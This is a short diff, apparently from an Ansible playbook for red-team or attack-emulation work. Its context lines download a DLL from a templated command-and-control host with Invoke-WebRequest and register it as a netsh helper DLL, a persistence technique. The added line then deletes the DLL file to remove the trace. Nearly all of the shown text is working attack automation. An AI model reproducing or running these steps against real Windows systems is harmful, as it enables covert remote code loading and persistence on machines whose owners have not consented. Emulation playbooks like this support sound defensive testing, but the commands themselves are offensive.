@@ -9,6 +9,7 @@
         Invoke-WebRequest -Uri http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ cnc_dll }} -OutFile C:\temp\{{ cnc_dll }}
         cd c:\temp
         netsh.exe add helper {{ cnc_dll }}
+        del {{ cnc_dll }}
     - name: check file exist
       tags: always
       win_stat:
